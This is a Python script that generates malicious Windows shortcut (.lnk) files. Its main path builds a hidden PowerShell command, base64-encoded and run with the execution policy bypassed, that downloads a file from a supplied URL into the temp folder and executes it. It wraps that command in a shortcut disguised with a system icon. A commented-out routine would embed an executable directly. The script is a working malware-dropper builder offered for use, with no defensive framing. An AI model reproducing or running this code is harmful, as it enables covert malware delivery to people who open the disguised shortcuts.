
#!/usr/bin/env python
# -.- coding: utf-8 -.-
# shortcut.py
# authors: kaisai12

"""
Copyright (C) 201 kaisai12 (kaisai@ceh.vn)
"""




import random, sys, string;
from subprocess import Popen, PIPE
from base64 import b64encode
import argparse
import os

class builder():
	def __init__(self,options,):
		self.options = options
	@staticmethod
	def base64payload(url,save):
		endata = '(New-Object System.Net.WebClient).DownloadFile("{0}", "$env:temp\{1}");[System.Diagnostics.Process]::Start("$env:temp\{2}");'.format(url,save,save)
		return b64encode(endata.encode('UTF-16LE')) 
	@staticmethod
	def ganeratepowershell(url,save):
		
		maliciouspw = "powershell -NonI -W Hidden -NoP -Exec Bypass -EncodedCommand %s" % (str(builder.base64payload(url,save)))
		return maliciouspw
	@staticmethod
	def ganeratepowershellvbs(string):
		
		maliciouspw = "powershell -NonI -W Hidden -NoP -Exec Bypass -Enc %s" % (str(b64encode(string.encode('UTF-16LE'))))
		return maliciouspw

	def vbs(self):
		try:
			builder.makepayload(builder.genaratevbs("",self.infile),"kai","2")
			
			print '[+] Build vbs... '
			
		except Exception as ex:
			print ex
	@staticmethod
	def makepayload(string,name,icon):
		if string and name and icon != '':
			
			
			payload = "$WshShell = New-Object -ComObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('{1}.lnk');$Shortcut.TargetPath = 'cmd.exe';$Shortcut.Arguments =' /c {0}';$Shortcut.IconLocation = 'shell32.dll,{2}';$Shortcut.Save()".format(string,name,icon)
			
			try:
				
				a = Popen('powershell -EncodedCommand '+b64encode(payload.encode('UTF-16LE')),stdin = PIPE, stdout = PIPE, stderr = PIPE, shell = False)
				print "[+] Done "
				print "[+] File save: %s" % os.getcwd() + "\out.lnk"

			except Exception as e:
				print '[-] %s' % e
	def base64codeps(self,string):

		return b64encode(string.encode('UTF-16LE'))

	# def makebuildermarco(self): # function not working ? are you sure =))
	# 	if self.infile != '':
	# 		payload = '$ByteArray = [System.IO.File]::ReadAllBytes("{0}");$Base64String = [System.Convert]::ToBase64String($ByteArray);$Base64String'.format(str(self.infile))
	# 		try:
	# 			a = Popen('powershell -EncodedCommand '+self.base64codeps(payload),stdin = PIPE, stdout = PIPE, stderr = PIPE,shell = True).communicate()
				
	# 			payload2 = '[System.IO.File]::WriteAllBytes("temp.exe", [System.Convert]::FromBase64String("{0}"));'.format(str(a[0]))
				
	# 			maliciouspw = "powershell -NonI -W Hidden -NoP -Exec Bypass -EncodedCommand %s" % (str(self.base64codeps(payload2)))
				
	# 			builder.makepayload(maliciouspw,"ahihi.lnk","1")
	# 			print '[+] Buiding OK '


	# 		except Exception as e:
	# 			print '[-] %s' % e


def banner():
	banner = '''
	  __                             _                                    
 (_  |_   _  ._ _|_  _    _|_   | \  _       ._  |  _   _.  _|  _  ._ 
 __) | | (_) |   |_ (_ |_| |_   |_/ (_) \/\/ | | | (_) (_| (_| (/_ |  
                                                                                                                                                                                                                '''


	return banner                                                                                                                                              			

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-p', '--type', help='Type building (download)')
	parser.add_argument('-l', '--link', help='Link file download ')
	parser.add_argument('-s', '--save', help='output name ')
	parser.add_argument('-i', '--icon', default='1' ,help='Type icon ')
	return parser.parse_args()

if __name__ == '__main__':
	print banner()
	arg = parse_args()
	if not arg.type:
		
		sys.exit('[!] Error (exam shortcut.py -p <payload> -k <link> -s <save.type> -i <icon> ')
	if arg.type == 'download' and arg.link != '' and arg.save != '':
		builder.makepayload(builder.ganeratepowershell(arg.link,arg.save),"out",arg.icon)
